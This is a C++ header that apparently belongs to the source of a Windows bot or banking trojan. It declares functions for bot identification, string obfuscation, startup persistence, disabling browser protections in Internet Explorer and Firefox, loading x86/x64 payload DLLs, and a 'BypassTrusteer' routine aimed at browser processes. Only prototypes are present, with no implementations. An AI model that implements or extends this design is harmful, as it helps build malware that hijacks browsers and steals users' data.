#pragma once
#include "Common.h"
#include <vector>
#include <string>
#include <algorithm>

using namespace std;
#include <iostream>
#include <fstream>

#define BOT_ID_LEN 35

void     GetBotId(char *botId);
void     Obfuscate(BYTE *buffer, DWORD bufferSize, char *key);
char    *Utf16toUtf8(const wchar_t *utf16);
wchar_t *Utf8toUtf16(const char *utf8);
char    *UnEnc(char *enc, char *key, DWORD encLen);
void     GetInstallPath(char *installPath);
BOOL     GetUserSidStr(PCHAR *sidStr);
HANDLE   NtRegOpenKey(PCHAR subKey);
void     SetStartupValue(char *path);
BOOL     VerifyPe(BYTE *pe, DWORD peSize);
BOOL     IsProcessX64(HANDLE hProcess);
void    *Alloc(size_t size);
void    *AllocZ(size_t size);
void    *ReAlloc(void *mem, size_t size);
DWORD    GetPidExplorer();
void     SetFirefoxPrefs();
void     DisableMultiProcessesAndProtectedModeIe();
void     GetDlls(BYTE **x86, BYTE **x64, BOOL update);
void     GetTempPathBotPrefix(char *path);
DWORD    BypassTrusteer(PROCESS_INFORMATION *processInfo, char *browserPath, char *browserCommandLine);
void     CopyDir(char *from, char *to);
void	 getInstallationAppsList(vector<string>& list);
void	 WriteLog(const char* content);
size_t caseInsensitiveFind(const std::string& haystack, const std::string& needle);
std::string getLocalAppdata();